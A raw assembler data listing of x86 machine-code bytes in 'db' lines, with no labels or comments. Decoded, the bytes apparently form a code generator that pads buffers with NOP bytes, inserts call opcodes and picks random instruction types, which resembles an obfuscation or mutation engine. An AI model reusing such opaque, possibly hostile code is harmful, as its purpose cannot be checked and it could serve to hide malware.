db 0ffh, 075h, 014h, 0e8h, 0dah, 018h, 000h, 000h, 0ffh, 075h, 014h, 089h, 045h, 008h
db 0e8h, 0b7h, 01ah, 000h, 000h, 083h, 0c4h, 02ch, 083h, 07dh, 008h, 000h, 075h, 004h
db 033h, 0c0h, 0ebh, 075h, 08bh, 045h, 0f0h, 003h, 075h, 008h, 02bh, 045h, 008h, 074h
db 068h, 089h, 045h, 008h, 050h, 08dh, 004h, 03eh, 050h, 053h, 0ffh, 075h, 0fch, 0ffh
db 075h, 00ch, 06ah, 000h, 06ah, 007h, 0e8h, 03ah, 00ah, 000h, 000h, 029h, 045h, 008h
db 083h, 065h, 014h, 000h, 083h, 0c4h, 01ch, 003h, 0f0h, 083h, 07dh, 008h, 000h, 076h
db 03eh, 08bh, 04dh, 008h, 08dh, 004h, 03eh, 02bh, 04dh, 014h, 051h, 050h, 053h, 0ffh
db 075h, 0fch, 0ffh, 075h, 00ch, 06ah, 000h, 06ah, 007h, 0e8h, 00dh, 00ah, 000h, 000h
db 083h, 0c4h, 01ch, 085h, 0c0h, 074h, 00bh, 08bh, 04dh, 014h, 003h, 0f0h, 08dh, 044h
db 001h, 0ffh, 0ebh, 008h, 08bh, 045h, 014h, 0c6h, 004h, 03eh, 090h, 046h, 040h, 03bh
db 045h, 008h, 089h, 045h, 014h, 072h, 0c2h, 08bh, 0c6h, 05fh, 05eh, 05bh, 0c9h, 0c3h
db 055h, 08bh, 0ech, 051h, 053h, 056h, 057h, 068h, 000h, 028h, 000h, 000h, 068h, 000h
db 004h, 000h, 000h, 0e8h, 022h, 030h, 000h, 000h, 08bh, 04dh, 00ch, 089h, 045h, 0fch
db 08dh, 05ch, 008h, 018h, 053h, 06ah, 001h, 0ffh, 015h, 008h, 04dh, 000h, 000h, 08bh
db 0f0h, 083h, 0c4h, 010h, 085h, 0f6h, 074h, 04bh, 085h, 0dbh, 076h, 017h, 08bh, 0cbh
db 0b8h, 090h, 090h, 090h, 090h, 08bh, 0d1h, 08bh, 0feh, 0c1h, 0e9h, 002h, 0f3h, 0abh
db 08bh, 0cah, 083h, 0e1h, 003h, 0f3h, 0aah, 08bh, 045h, 010h, 068h, 0feh, 0ffh, 0feh
db 0ffh, 06ah, 000h, 089h, 018h, 0e8h, 08ch, 02fh, 000h, 000h, 050h, 089h, 045h, 010h
db 0ffh, 075h, 00ch, 0ffh, 075h, 0fch, 056h, 0e8h, 088h, 0fch, 0ffh, 0ffh, 083h, 0c4h
db 018h, 085h, 0c0h, 075h, 00ch, 056h, 0ffh, 015h, 00ch, 04dh, 000h, 000h, 059h, 033h
db 0c0h, 0ebh, 04bh, 06ah, 004h, 033h, 0c9h, 05ah, 039h, 055h, 00ch, 072h, 01bh, 08bh
db 07dh, 008h, 083h, 0c2h, 004h, 08bh, 05ch, 017h, 0f8h, 08dh, 03ch, 030h, 003h, 05dh
db 010h, 089h, 01ch, 00fh, 083h, 0c1h, 004h, 03bh, 055h, 00ch, 076h, 0e5h, 03bh, 04dh
db 00ch, 073h, 01fh, 08bh, 0d1h, 08dh, 03ch, 030h, 08bh, 05dh, 008h, 08ah, 01ch, 019h
db 088h, 01ch, 00fh, 041h, 03bh, 04dh, 00ch, 072h, 0f1h, 08bh, 04dh, 010h, 003h, 0d0h
db 001h, 00ch, 032h, 08dh, 004h, 032h, 08bh, 0c6h, 05fh, 05eh, 05bh, 0c9h, 0c3h, 055h
db 08bh, 0ech, 051h, 053h, 056h, 057h, 060h, 08bh, 045h, 008h, 08ah, 04dh, 00ch, 0d3h
db 0c8h, 089h, 045h, 0fch, 061h, 08bh, 045h, 0fch, 05fh, 05eh, 05bh, 0c9h, 0c3h, 055h
db 08bh, 0ech, 083h, 0ech, 040h, 053h, 056h, 057h, 06ah, 014h, 058h, 033h, 0f6h, 089h
db 045h, 0ech, 089h, 045h, 0f8h, 08bh, 045h, 00ch, 089h, 075h, 0f4h, 03dh, 0a5h, 000h
db 000h, 000h, 089h, 075h, 0e8h, 08dh, 0b8h, 05bh, 0ffh, 0ffh, 0ffh, 00fh, 082h, 064h
db 002h, 000h, 000h, 03bh, 0feh, 074h, 050h, 08dh, 047h, 0ffh, 050h, 056h, 0e8h, 0c1h
db 02eh, 000h, 000h, 059h, 02bh, 0f8h, 059h, 089h, 045h, 0f4h, 074h, 03dh, 08dh, 047h
db 0ffh, 050h, 056h, 0e8h, 0aeh, 02eh, 000h, 000h, 059h, 02bh, 0f8h, 059h, 089h, 045h
db 0e8h, 074h, 02ah, 08dh, 047h, 0ffh, 050h, 056h, 0e8h, 09bh, 02eh, 000h, 000h, 02bh
db 0f8h, 059h, 08dh, 040h, 014h, 059h, 089h, 045h, 0ech, 074h, 014h, 08dh, 047h, 0ffh
db 050h, 056h, 0e8h, 085h, 02eh, 000h, 000h, 02bh, 0f8h, 059h, 083h, 0c0h, 014h, 059h
db 089h, 045h, 0f8h, 083h, 0c7h, 078h, 06ah, 007h, 056h, 089h, 07dh, 0f0h, 0e8h, 0bbh
db 02eh, 000h, 000h, 059h, 089h, 045h, 00ch, 059h, 06ah, 004h, 05fh, 03bh, 0c7h, 075h
db 00fh, 06ah, 007h, 056h, 0e8h, 0a7h, 02eh, 000h, 000h, 059h, 089h, 045h, 00ch, 059h
db 0ebh, 0edh, 06ah, 007h, 056h, 0e8h, 098h, 02eh, 000h, 000h, 03bh, 045h, 00ch, 059h
db 059h, 089h, 045h, 0fch, 074h, 0eeh, 03bh, 0c7h, 074h, 0eah, 050h, 0e8h, 095h, 018h
db 000h, 000h, 0ffh, 075h, 00ch, 08bh, 0d8h, 0e8h, 08bh, 018h, 000h, 000h, 057h, 00bh
db 0d8h, 0e8h, 083h, 018h, 000h, 000h, 0ffh, 075h, 0f4h, 08bh, 07dh, 008h, 00bh, 0d8h
db 057h, 053h, 0ffh, 075h, 0fch, 0ffh, 075h, 00ch, 056h, 06ah, 007h, 0e8h, 005h, 008h
db 000h, 000h, 08bh, 04dh, 0e8h, 08bh, 0f0h, 08bh, 045h, 0ech, 0c6h, 004h, 03eh, 0e8h
db 083h, 064h, 03eh, 001h, 000h, 046h, 003h, 0c1h, 083h, 0c6h, 004h, 050h, 08dh, 004h
db 03eh, 050h, 053h, 0ffh, 075h, 0fch, 0ffh, 075h, 00ch, 06ah, 000h, 06ah, 00ah, 0e8h
db 0d9h, 007h, 000h, 000h, 08bh, 04dh, 0f8h, 003h, 0f0h, 083h, 0c4h, 044h, 089h, 04dh
db 008h, 08dh, 014h, 03eh, 051h, 052h, 08bh, 055h, 0f0h, 053h, 003h, 0d1h, 003h, 0d0h
db 052h, 0ffh, 075h, 00ch, 06ah, 003h, 06ah, 001h, 0e8h, 0b4h, 007h, 000h, 000h, 083h
db 0c4h, 01ch, 003h, 0f0h, 03bh, 045h, 008h, 089h, 045h, 0f8h, 074h, 052h, 089h, 045h
db 0f4h, 073h, 04dh, 08bh, 04dh, 008h, 08dh, 004h, 03eh, 02bh, 04dh, 0f4h, 051h, 050h
db 053h, 0ffh, 075h, 0fch, 0ffh, 075h, 00ch, 06ah, 000h, 06ah, 007h, 0e8h, 087h, 007h
db 000h, 000h, 083h, 0c4h, 01ch, 085h, 0c0h, 074h, 017h, 08bh, 04dh, 0f4h, 08bh, 055h
db 0f8h, 08dh, 074h, 006h, 0ffh, 08dh, 04ch, 001h, 0ffh, 08dh, 044h, 002h, 0ffh, 089h
db 045h, 0f8h, 0ebh, 007h, 08bh, 04dh, 0f4h, 0c6h, 004h, 03eh, 090h, 041h, 046h, 0ffh
db 045h, 0f8h, 03bh, 04dh, 008h, 089h, 04dh, 0f4h, 072h, 0b3h, 06ah, 014h, 058h, 089h
db 045h, 008h, 089h, 045h, 0e8h, 08bh, 045h, 0f0h, 083h, 0c0h, 088h, 085h, 0c0h, 089h
db 045h, 0ech, 074h, 029h, 048h, 050h, 06ah, 000h, 0e8h, 03dh, 02dh, 000h, 000h, 059h
db 059h, 08bh, 04dh, 0ech, 02bh, 0c8h, 08dh, 040h, 014h, 089h, 045h, 008h, 074h, 011h
db 049h, 051h, 06ah, 000h, 0e8h, 025h, 02dh, 000h, 000h, 059h, 083h, 0c0h, 014h, 059h
db 089h, 045h, 0e8h, 08bh, 04dh, 00ch, 08bh, 045h, 008h, 089h, 04dh, 0cch, 08bh, 04dh
db 014h, 081h, 0e1h, 0ffh, 000h, 000h, 000h, 089h, 045h, 0d8h, 089h, 04dh, 0d0h, 08dh
db 04dh, 0c0h, 033h, 0c0h, 051h, 050h, 089h, 05dh, 0d4h, 089h, 045h, 0c0h, 0c7h, 045h
db 0c4h, 00bh, 000h, 000h, 000h, 0c7h, 045h, 0c8h, 004h, 000h, 000h, 000h, 089h, 045h
db 0e0h, 089h, 045h, 0dch, 089h, 045h, 0e4h, 0e8h, 0a7h, 016h, 000h, 000h, 089h, 045h
db 014h, 08bh, 045h, 0e8h, 089h, 045h, 0d8h, 08bh, 04dh, 00ch, 033h, 0c0h, 089h, 05dh
db 0d4h, 089h, 045h, 0c0h, 089h, 045h, 0e0h, 089h, 045h, 0dch, 089h, 045h, 0e4h, 08dh
db 045h, 0c0h, 089h, 04dh, 0cch, 050h, 0c7h, 045h, 0d0h, 004h, 000h, 000h, 000h, 0ffh
db 075h, 014h, 0c7h, 045h, 0c4h, 001h, 000h, 000h, 000h, 0c7h, 045h, 0c8h, 003h, 000h
db 000h, 000h, 0e8h, 066h, 016h, 000h, 000h, 08dh, 004h, 03eh, 050h, 08bh, 045h, 010h
db 083h, 0c0h, 003h, 053h, 0c1h, 0e8h, 002h, 050h, 06ah, 003h, 0ffh, 075h, 0fch, 0ffh
db 075h, 014h, 0e8h, 0ddh, 014h, 000h, 000h, 0ffh, 075h, 014h, 089h, 045h, 008h, 0e8h
db 0bah, 016h, 000h, 000h, 083h, 0c4h, 02ch, 083h, 07dh, 008h, 000h, 075h, 004h, 033h
db 0c0h, 0ebh, 075h, 08bh, 045h, 0f0h, 003h, 075h, 008h, 02bh, 045h, 008h, 074h, 068h
db 089h, 045h, 008h, 050h, 08dh, 004h, 03eh, 050h, 053h, 0ffh, 075h, 0fch, 0ffh, 075h
db 00ch, 06ah, 000h, 06ah, 007h, 0e8h, 03dh, 006h, 000h, 000h, 029h, 045h, 008h, 083h
db 065h, 014h, 000h, 083h, 0c4h, 01ch, 003h, 0f0h, 083h, 07dh, 008h, 000h, 076h, 03eh
db 08bh, 04dh, 008h, 08dh, 004h, 03eh, 02bh, 04dh, 014h, 051h, 050h, 053h, 0ffh, 075h
db 0fch, 0ffh, 075h, 00ch, 06ah, 000h, 06ah, 007h, 0e8h, 010h, 006h, 000h, 000h, 083h
db 0c4h, 01ch, 085h, 0c0h, 074h, 00bh, 08bh, 04dh, 014h, 003h, 0f0h, 08dh, 044h, 001h
db 0ffh, 0ebh, 008h, 08bh, 045h, 014h, 0c6h, 004h, 03eh, 090h, 046h, 040h, 03bh, 045h
db 008h, 089h, 045h, 014h, 072h, 0c2h, 08bh, 0c6h, 05fh, 05eh, 05bh, 0c9h, 0c3h, 055h
db 08bh, 0ech, 051h, 051h, 053h, 056h, 057h, 0e8h, 063h, 02bh, 000h, 000h, 0a8h, 001h
db 074h, 016h, 0ffh, 075h, 010h, 0ffh, 075h, 00ch, 0ffh, 075h, 008h, 0e8h, 0e4h, 0fbh
db 0ffh, 0ffh, 083h, 0c4h, 00ch, 0e9h, 0e1h, 000h, 000h, 000h, 068h, 000h, 028h, 000h
db 000h, 068h, 000h, 004h, 000h, 000h, 0e8h, 005h, 02ch, 000h, 000h, 08bh, 04dh, 00ch
db 089h, 045h, 0f8h, 08dh, 074h, 008h, 018h, 056h, 06ah, 001h, 0ffh, 015h, 008h, 04dh
db 000h, 000h, 08bh, 0d8h, 083h, 0c4h, 010h, 085h, 0dbh, 074h, 04dh, 085h, 0f6h, 076h
db 017h, 08bh, 0ceh, 0b8h, 090h, 090h, 090h, 090h, 08bh, 0d1h, 08bh, 0fbh, 0c1h, 0e9h
db 002h, 0f3h, 0abh, 08bh, 0cah, 083h, 0e1h, 003h, 0f3h, 0aah, 08bh, 045h, 010h, 068h
db 0feh, 0ffh, 0feh, 0ffh, 06ah, 000h, 089h, 030h, 0e8h, 06fh, 02bh, 000h, 000h, 050h
db 089h, 045h, 0fch, 0ffh, 075h, 00ch, 0ffh, 075h, 0f8h, 053h, 0e8h, 062h, 0fch, 0ffh
db 0ffh, 08bh, 0f8h, 083h, 0c4h, 018h, 085h, 0ffh, 075h, 00ch, 053h, 0ffh, 015h, 00ch
db 04dh, 000h, 000h, 059h, 033h, 0c0h, 0ebh, 065h, 06ah, 004h, 033h, 0f6h, 058h, 039h
db 045h, 00ch, 072h, 02ch, 089h, 045h, 010h, 0ffh, 075h, 0fch, 08bh, 045h, 008h, 08bh
db 04dh, 010h, 0ffh, 074h, 008h, 0fch, 0e8h, 012h, 0fch, 0ffh, 0ffh, 083h, 045h, 010h
db 004h, 059h, 059h, 08dh, 00ch, 01fh, 089h, 004h, 031h, 08bh, 045h, 010h, 083h, 0c6h
db 004h, 03bh, 045h, 00ch, 076h, 0d7h, 03bh, 075h, 00ch, 073h, 028h, 08bh, 0ceh, 08dh
db 004h, 01fh, 08bh, 055h, 008h, 08ah, 014h, 016h, 088h, 014h, 030h, 046h, 03bh, 075h
db 00ch, 072h, 0f1h, 0ffh, 075h, 0fch, 003h, 0cfh, 0ffh, 034h, 019h, 08dh, 034h, 019h
db 0e8h, 0d2h, 0fbh, 0ffh, 0ffh, 059h, 089h, 006h, 059h, 08bh, 0c3h, 05fh, 05eh, 05bh
db 0c9h, 0c3h, 055h, 08bh, 0ech, 083h, 0ech, 040h, 053h, 056h, 057h, 06ah, 014h, 058h
db 033h, 0f6h, 089h, 045h, 0ech, 089h, 045h, 0f8h, 08bh, 045h, 00ch, 089h, 075h, 0f4h
db 03dh, 0a5h, 000h, 000h, 000h, 089h, 075h, 0e8h, 08dh, 0b8h, 05bh, 0ffh, 0ffh, 0ffh
db 00fh, 082h, 05eh, 002h, 000h, 000h, 03bh, 0feh, 074h, 050h, 08dh, 047h, 0ffh, 050h
db 056h, 0e8h, 0a4h, 02ah, 000h, 000h, 059h, 02bh, 0f8h, 059h, 089h, 045h, 0f4h, 074h
db 03dh, 08dh, 047h, 0ffh, 050h, 056h, 0e8h, 091h, 02ah, 000h, 000h, 059h, 02bh, 0f8h
db 059h, 089h, 045h, 0e8h, 074h, 02ah, 08dh, 047h, 0ffh, 050h, 056h, 0e8h, 07eh, 02ah
db 000h, 000h, 02bh, 0f8h, 059h, 08dh, 040h, 014h, 059h, 089h, 045h, 0ech, 074h, 014h
db 08dh, 047h, 0ffh, 050h, 056h, 0e8h, 068h, 02ah, 000h, 000h, 02bh, 0f8h, 059h, 083h
db 0c0h, 014h, 059h, 089h, 045h, 0f8h, 083h, 0c7h, 078h, 06ah, 007h, 056h, 089h, 07dh
db 0f0h, 0e8h, 09eh, 02ah, 000h, 000h, 059h, 089h, 045h, 00ch, 059h, 06ah, 004h, 05fh
db 03bh, 0c7h, 075h, 00fh, 06ah, 007h, 056h, 0e8h, 08ah, 02ah, 000h, 000h, 059h, 089h
db 045h, 00ch, 059h, 0ebh, 0edh, 06ah, 007h, 056h, 0e8h, 07bh, 02ah, 000h, 000h, 03bh
db 045h, 00ch, 059h, 059h, 089h, 045h, 0fch, 074h, 0eeh, 03bh, 0c7h, 074h, 0eah, 050h
db 0e8h, 078h, 014h, 000h, 000h, 0ffh, 075h, 00ch, 08bh, 0d8h, 0e8h, 06eh, 014h, 000h
db 000h, 057h, 00bh, 0d8h, 0e8h, 066h, 014h, 000h, 000h, 0ffh, 075h, 0f4h, 08bh, 07dh
db 008h, 00bh, 0d8h, 057h, 053h, 0ffh, 075h, 0fch, 0ffh, 075h, 00ch, 056h, 06ah, 007h
db 0e8h, 0e8h, 003h, 000h, 000h, 08bh, 04dh, 0e8h, 08bh, 0f0h, 08bh, 045h, 0ech, 0c6h
db 004h, 03eh, 0e8h, 083h, 064h, 03eh, 001h, 000h, 046h, 003h, 0c1h, 083h, 0c6h, 004h
db 050h, 08dh, 004h, 03eh, 050h, 053h, 0ffh, 075h, 0fch, 0ffh, 075h, 00ch, 06ah, 000h
db 06ah, 00ah, 0e8h, 0bch, 003h, 000h, 000h, 08bh, 04dh, 0f8h, 003h, 0f0h, 083h, 0c4h
db 044h, 089h, 04dh, 008h, 08dh, 014h, 03eh, 051h, 052h, 08bh, 055h, 0f0h, 053h, 003h
db 0d1h, 003h, 0d0h, 052h, 0ffh, 075h, 00ch, 06ah, 003h, 06ah, 001h, 0e8h, 097h, 003h
db 000h, 000h, 083h, 0c4h, 01ch, 003h, 0f0h, 03bh, 045h, 008h, 089h, 045h, 0f8h, 074h
db 052h, 089h, 045h, 0f4h, 073h, 04dh, 08bh, 04dh, 008h, 08dh, 004h, 03eh, 02bh, 04dh
db 0f4h, 051h, 050h, 053h, 0ffh, 075h, 0fch, 0ffh, 075h, 00ch, 06ah, 000h, 06ah, 007h
db 0e8h, 06ah, 003h, 000h, 000h, 083h, 0c4h, 01ch, 085h, 0c0h, 074h, 017h, 08bh, 04dh
db 0f4h, 08bh, 055h, 0f8h, 08dh, 074h, 006h, 0ffh, 08dh, 04ch, 001h, 0ffh, 08dh, 044h
db 002h, 0ffh, 089h, 045h, 0f8h, 0ebh, 007h, 08bh, 04dh, 0f4h, 0c6h, 004h, 03eh, 090h
db 041h, 046h, 0ffh, 045h, 0f8h, 03bh, 04dh, 008h, 089h, 04dh, 0f4h, 072h, 0b3h, 06ah
db 014h, 058h, 089h, 045h, 008h, 089h, 045h, 0e8h, 08bh, 045h, 0f0h, 083h, 0c0h, 088h
db 085h, 0c0h, 089h, 045h, 0ech, 074h, 029h, 048h, 050h, 06ah, 000h, 0e8h, 020h, 029h
db 000h, 000h, 059h, 059h, 08bh, 04dh, 0ech, 02bh, 0c8h, 08dh, 040h, 014h, 089h, 045h
db 008h, 074h, 011h, 049h, 051h, 06ah, 000h, 0e8h, 008h, 029h, 000h, 000h, 059h, 083h
db 0c0h, 014h, 059h, 089h, 045h, 0e8h, 08bh, 04dh, 00ch, 08bh, 045h, 008h, 089h, 04dh
db 0cch, 08bh, 04dh, 014h, 089h, 04dh, 0d0h, 089h, 045h, 0d8h, 08dh, 04dh, 0c0h, 033h
db 0c0h, 051h, 050h, 089h, 05dh, 0d4h, 089h, 045h, 0c0h, 0c7h, 045h, 0c4h, 005h, 000h
db 000h, 000h, 0c7h, 045h, 0c8h, 004h, 000h, 000h, 000h, 089h, 045h, 0e0h, 089h, 045h
db 0dch, 089h, 045h, 0e4h, 0e8h, 090h, 012h, 000h, 000h, 089h, 045h, 014h, 08bh, 045h
db 0e8h, 089h, 045h, 0d8h, 08bh, 04dh, 00ch, 033h, 0c0h, 089h, 05dh, 0d4h, 089h, 045h
db 0c0h, 089h, 045h, 0e0h, 089h, 045h, 0dch, 089h, 045h, 0e4h, 08dh, 045h, 0c0h, 089h
db 04dh, 0cch, 050h, 0c7h, 045h, 0d0h, 004h, 000h, 000h, 000h, 0ffh, 075h, 014h, 0c7h
db 045h, 0c4h, 001h, 000h, 000h, 000h, 0c7h, 045h, 0c8h, 003h, 000h, 000h, 000h, 0e8h
db 04fh, 012h, 000h, 000h, 08dh, 004h, 03eh, 050h, 08bh, 045h, 010h, 083h, 0c0h, 003h
db 053h, 0c1h, 0e8h, 002h, 050h, 06ah, 003h, 0ffh, 075h, 0fch, 0ffh, 075h, 014h, 0e8h
db 0c6h, 010h, 000h, 000h, 0ffh, 075h, 014h, 089h, 045h, 008h, 0e8h, 0a3h, 012h, 000h
db 000h, 083h, 0c4h, 02ch, 083h, 07dh, 008h, 000h, 075h, 004h, 033h, 0c0h, 0ebh, 075h
db 08bh, 045h, 0f0h, 003h, 075h, 008h, 02bh, 045h, 008h, 074h, 068h, 089h, 045h, 008h
db 050h, 08dh, 004h, 03eh, 050h, 053h, 0ffh, 075h, 0fch, 0ffh, 075h, 00ch, 06ah, 000h
db 06ah, 007h, 0e8h, 026h, 002h, 000h, 000h, 029h, 045h, 008h, 083h, 065h, 014h, 000h
db 083h, 0c4h, 01ch, 003h, 0f0h, 083h, 07dh, 008h, 000h, 076h, 03eh, 08bh, 04dh, 008h
db 08dh, 004h, 03eh, 02bh, 04dh, 014h, 051h, 050h, 053h, 0ffh, 075h, 0fch, 0ffh, 075h
db 00ch, 06ah, 000h, 06ah, 007h, 0e8h, 0f9h, 001h, 000h, 000h, 083h, 0c4h, 01ch, 085h
db 0c0h, 074h, 00bh, 08bh, 04dh, 014h, 003h, 0f0h, 08dh, 044h, 001h, 0ffh, 0ebh, 008h
db 08bh, 045h, 014h, 0c6h, 004h, 03eh, 090h, 046h, 040h, 03bh, 045h, 008h, 089h, 045h
db 014h, 072h, 0c2h, 08bh, 0c6h, 05fh, 05eh, 05bh, 0c9h, 0c3h, 055h, 08bh, 0ech, 051h
db 053h, 056h, 057h, 0e8h, 04dh, 027h, 000h, 000h, 0a8h, 001h, 074h, 016h, 0ffh, 075h
db 010h, 0ffh, 075h, 00ch, 0ffh, 075h, 008h, 0e8h, 0cbh, 0fbh, 0ffh, 0ffh, 083h, 0c4h
db 00ch, 0e9h, 0c5h, 000h, 000h, 000h, 068h, 000h, 028h, 000h, 000h, 068h, 000h, 004h
db 000h, 000h, 0e8h, 0efh, 027h, 000h, 000h, 08bh, 04dh, 00ch, 089h, 045h, 0fch, 08dh
db 074h, 008h, 018h, 056h, 06ah, 001h, 0ffh, 015h, 008h, 04dh, 000h, 000h, 08bh, 0d8h
db 083h, 0c4h, 010h, 085h, 0dbh, 074h, 04dh, 085h, 0f6h, 076h, 017h, 08bh, 0ceh, 0b8h
db 090h, 090h, 090h, 090h, 08bh, 0d1h, 08bh, 0fbh, 0c1h, 0e9h, 002h, 0f3h, 0abh, 08bh
db 0cah, 083h, 0e1h, 003h, 0f3h, 0aah, 08bh, 045h, 010h, 068h, 0feh, 0ffh, 0feh, 0ffh
db 06ah, 000h, 089h, 030h, 0e8h, 059h, 027h, 000h, 000h, 050h, 089h, 045h, 010h, 0ffh
db 075h, 00ch, 0ffh, 075h, 0fch, 053h, 0e8h, 069h, 0fch, 0ffh, 0ffh, 08bh, 0f0h, 083h
db 0c4h, 018h, 085h, 0f6h, 075h, 00ch, 053h, 0ffh, 015h, 00ch, 04dh, 000h, 000h, 059h
db 033h, 0c0h, 0ebh, 049h, 06ah, 004h, 033h, 0c9h, 058h, 039h, 045h, 00ch, 072h, 01bh
db 08bh, 055h, 008h, 083h, 0c0h, 004h, 08bh, 07ch, 002h, 0f8h, 08dh, 014h, 01eh, 033h
db 07dh, 010h, 089h, 03ch, 00ah, 083h, 0c1h, 004h, 03bh, 045h, 00ch, 076h, 0e5h, 03bh
db 04dh, 00ch, 073h, 01dh, 08bh, 0c1h, 08dh, 03ch, 01eh, 08bh, 055h, 008h, 08ah, 014h
db 011h, 088h, 014h, 00fh, 041h, 03bh, 04dh, 00ch, 072h, 0f1h, 08bh, 04dh, 010h, 003h
db 0c6h, 003h, 0c3h, 031h, 008h, 08bh, 0c3h, 05fh, 05eh, 05bh, 0c9h, 0c3h, 055h, 08bh
db 0ech, 051h, 051h, 083h, 07dh, 010h, 000h, 053h, 056h, 057h, 075h, 007h, 033h, 0c0h
db 0e9h, 0b5h, 000h, 000h, 000h, 068h, 010h, 027h, 000h, 000h, 06ah, 032h, 0e8h, 0c5h
db 026h, 000h, 000h, 08bh, 07dh, 00ch, 08bh, 0f0h, 08dh, 004h, 03eh, 050h, 06ah, 001h
db 089h, 045h, 0f8h, 0ffh, 015h, 008h, 04dh, 000h, 000h, 08bh, 0d8h, 033h, 0c0h, 083h
db 0c4h, 010h, 03bh, 0f0h, 074h, 076h, 03bh, 0d8h, 074h, 07eh, 056h, 053h, 06ah, 010h
db 050h, 050h, 050h, 06ah, 007h, 0e8h, 08dh, 000h, 000h, 000h, 083h, 0c4h, 01ch, 03bh
db 0c6h, 073h, 033h, 08dh, 00ch, 018h, 08bh, 0feh, 089h, 04dh, 0fch, 02bh, 0f8h, 06ah
db 001h, 033h, 0c0h, 0ffh, 075h, 0fch, 06ah, 010h, 050h, 050h, 050h, 06ah, 007h, 0e8h
db 069h, 000h, 000h, 000h, 083h, 0c4h, 01ch, 085h, 0c0h, 075h, 006h, 08bh, 045h, 0fch
db 0c6h, 000h, 090h, 0ffh, 045h, 0fch, 04fh, 075h, 0dah, 08bh, 07dh, 00ch, 08bh, 04dh
db 008h, 033h, 0c0h, 085h, 0ffh, 076h, 00dh, 003h, 0f3h, 08ah, 014h, 008h, 088h, 014h
db 006h, 040h, 03bh, 0c7h, 072h, 0f5h, 051h, 0ffh, 015h, 00ch, 04dh, 000h, 000h, 08bh
db 045h, 0f8h, 059h, 08bh, 04dh, 010h, 089h, 001h, 08bh, 0c3h, 0ebh, 014h, 03bh, 0d8h
db 074h, 008h, 053h, 0ffh, 015h, 00ch, 04dh, 000h, 000h, 059h, 08bh, 045h, 010h, 089h
db 038h, 08bh, 045h, 008h, 05fh, 05eh, 05bh, 0c9h, 0c3h, 08bh, 044h, 024h, 008h, 048h
db 050h, 06ah, 000h, 0e8h, 00ah, 026h, 000h, 000h, 059h, 059h, 0c3h, 055h, 08bh, 0ech
db 08bh, 045h, 008h, 083h, 0f8h, 007h, 00fh, 087h, 0a3h, 000h, 000h, 000h, 00fh, 084h
db 084h, 000h, 000h, 000h, 083h, 0e8h, 000h, 074h, 063h, 048h, 074h, 044h, 048h, 074h
db 025h, 083h, 0e8h, 003h, 00fh, 085h, 097h, 000h, 000h, 000h, 0ffh, 075h, 020h, 0ffh
db 075h, 01ch, 0ffh, 075h, 018h, 0ffh, 075h, 014h, 0ffh, 075h, 010h, 0ffh, 075h, 00ch
db 0e8h, 072h, 009h, 000h, 000h, 0e9h, 0e1h, 000h, 000h, 000h, 0ffh, 075h, 020h, 0ffh
db 075h, 01ch, 0ffh, 075h, 018h, 0ffh, 075h, 014h, 0ffh, 075h, 010h, 0ffh, 075h, 00ch
db 0e8h, 026h, 007h, 000h, 000h, 0e9h, 0c5h, 000h, 000h, 000h, 0ffh, 075h, 020h, 0ffh
db 075h, 01ch, 0ffh, 075h, 018h, 0ffh, 075h, 014h, 0ffh, 075h, 010h, 0ffh, 075h, 00ch
db 0e8h, 0fbh, 004h, 000h, 000h, 0e9h, 0a9h, 000h, 000h, 000h, 0ffh, 075h, 020h, 0ffh
db 075h, 01ch, 0ffh, 075h, 018h, 0ffh, 075h, 014h, 0ffh, 075h, 010h, 0ffh, 075h, 00ch
db 0e8h, 0a8h, 002h, 000h, 000h, 0e9h, 08dh, 000h, 000h, 000h, 0ffh, 075h, 020h, 0ffh
db 075h, 01ch, 0ffh, 075h, 018h, 0ffh, 075h, 014h, 0ffh, 075h, 010h, 0ffh, 075h, 00ch
db 0e8h, 07bh, 000h, 000h, 000h, 0ebh, 074h, 083h, 0e8h, 008h, 074h, 058h, 048h, 074h
db 03ch, 048h, 074h, 020h, 048h, 074h, 004h, 033h, 0c0h, 05dh, 0c3h, 0ffh, 075h, 020h
db 0ffh, 075h, 01ch, 0ffh, 075h, 018h, 0ffh, 075h, 014h, 0ffh, 075h, 010h, 0ffh, 075h
db 00ch, 0e8h, 0e3h, 00ch, 000h, 000h, 0ebh, 049h, 0ffh, 075h, 020h, 0ffh, 075h, 01ch
db 0ffh, 075h, 018h, 0ffh, 075h, 014h, 0ffh, 075h, 010h, 0ffh, 075h, 00ch, 0e8h, 086h
db 000h, 000h, 000h, 0ebh, 030h, 0ffh, 075h, 020h, 0ffh, 075h, 01ch, 0ffh, 075h, 018h
db 0ffh, 075h, 014h, 0ffh, 075h, 010h, 0ffh, 075h, 00ch, 0e8h, 04eh, 001h, 000h, 000h
db 0ebh, 017h, 0ffh, 075h, 020h, 0ffh, 075h, 01ch, 0ffh, 075h, 018h, 0ffh, 075h, 014h
db 0ffh, 075h, 010h, 0ffh, 075h, 00ch, 0e8h, 092h, 00ah, 000h, 000h, 083h, 0c4h, 018h
db 05dh, 0c3h, 055h, 08bh, 0ech, 051h, 083h, 065h, 0fch, 000h, 081h, 07dh, 01ch, 000h
db 000h, 000h, 0f0h, 076h, 004h, 033h, 0c0h, 0c9h, 0c3h, 08bh, 045h, 014h, 068h, 0d1h
db 022h, 000h, 000h, 0ffh, 075h, 018h, 08dh, 04dh, 0fch, 0f7h, 0d0h, 0ffh, 075h, 01ch
db 025h, 0ffh, 000h, 000h, 000h, 068h, 0ffh, 0ffh, 0ffh, 07fh, 051h, 050h, 050h, 068h
db 0ffh, 0ffh, 01fh, 000h, 0e8h, 020h, 024h, 000h, 000h, 050h, 0b8h, 000h, 010h, 000h
db 000h, 0ffh, 0d0h, 08bh, 045h, 0fch, 083h, 0c4h, 024h, 0c9h, 0c3h, 055h, 08bh, 0ech
db 056h, 057h, 08bh, 07dh, 01ch, 085h, 0ffh, 075h, 004h, 033h, 0c0h, 0ebh, 04fh, 0e8h
db 0fbh, 023h, 000h, 000h, 08bh, 075h, 018h, 0a8h, 001h, 074h, 01ah, 057h, 056h, 0ffh
db 075h, 014h, 0ffh, 075h, 010h, 0ffh, 075h, 00ch, 0ffh, 075h, 008h, 0e8h, 034h, 000h
db 000h, 000h, 083h, 0c4h, 018h, 085h, 0c0h, 075h, 029h, 08ah, 045h, 00ch, 08dh, 04fh
db 0ffh, 004h, 058h, 06ah, 001h, 088h, 006h, 058h, 085h, 0c9h, 074h, 018h, 046h, 051h
db 056h, 0ffh, 075h, 014h, 0ffh, 075h, 010h, 0ffh, 075h, 00ch, 0ffh, 075h, 008h, 0e8h
